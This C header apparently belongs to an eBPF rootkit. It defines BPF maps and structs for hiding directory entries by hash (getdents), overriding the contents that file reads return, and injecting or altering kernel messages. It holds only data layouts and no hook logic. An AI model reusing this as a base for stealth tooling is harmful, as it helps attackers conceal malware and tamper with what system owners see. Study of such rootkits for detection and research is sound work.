#ifndef __COMMON_H
#define __COMMON_H

#include <linux/kconfig.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/version.h>
#include <linux/dirent.h>

#include "include/bpf.h"
#include "include/bpf_helpers.h"

#include "defs.h"
#include "hash.h"

struct bpf_map_def SEC("maps/rk_progs") rk_progs = {
    .type = BPF_MAP_TYPE_PROG_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 20,
};

struct rk_action_t
{
    u64 id;
    s64 return_value;
    u64 override_id;
    u64 hidden_hash;
};

struct rk_file_t
{
    u64 fd;
    struct rk_action_t action;
};

struct bpf_map_def SEC("maps/rk_files") rk_files = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u64),
    .value_size = sizeof(struct rk_file_t),
    .max_entries = 4096,
    .pinning = 0,
    .namespace = "",
};

struct rk_fd_key_t
{
    u64 fd;
    u32 pid;
    u32 padding;
};

struct rk_fd_attr_t
{
    struct rk_action_t action;

    u64 override_chunk;

    void *read_buf;
    u64 read_size;

    u64 kmsg;
};

struct bpf_map_def SEC("maps/rk_fd_attrs") rk_fd_attrs = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(struct rk_fd_key_t),
    .value_size = sizeof(struct rk_fd_attr_t),
    .max_entries = 4096,
    .pinning = 0,
    .namespace = "",
};

struct rk_path_key_t
{
    u64 hash;
    u64 pos;
};

struct rk_path_attr_t
{
    u64 fs_hash;
    struct rk_action_t action;
};

struct bpf_map_def SEC("maps/rk_path_attrs") rk_path_attrs = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(struct rk_path_key_t),
    .value_size = sizeof(struct rk_path_attr_t),
    .max_entries = 4096,
    .pinning = 0,
    .namespace = "",
};

struct rk_fd_content_key_t
{
    u64 id;
    u32 chunk;
    u32 padding;
};

struct rk_fd_content_t
{
    u64 size;
    char content[64];
};

struct bpf_map_def SEC("maps/rk_fd_contents") rk_fd_contents = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(struct rk_fd_content_key_t),
    .value_size = sizeof(struct rk_fd_content_t),
    .max_entries = 4096,
    .pinning = 0,
    .namespace = "",
};

struct rk_getdents_t
{
    struct linux_dirent64 *dirent;
    u64 hidden_hash;

    u64 read;
    u64 reclen;
    void *src;
};

struct bpf_map_def SEC("maps/rk_getdents") rk_getdents = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u64),
    .value_size = sizeof(struct rk_getdents_t),
    .max_entries = 4096,
    .pinning = 0,
    .namespace = "",
};

struct kmsg_t {
    u64 size;
    char str[100];
};

struct bpf_map_def SEC("maps/rk_kmsg") rk_kmsg = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(struct kmsg_t),
    .max_entries = 30,
    .pinning = 0,
    .namespace = "",
};

#endif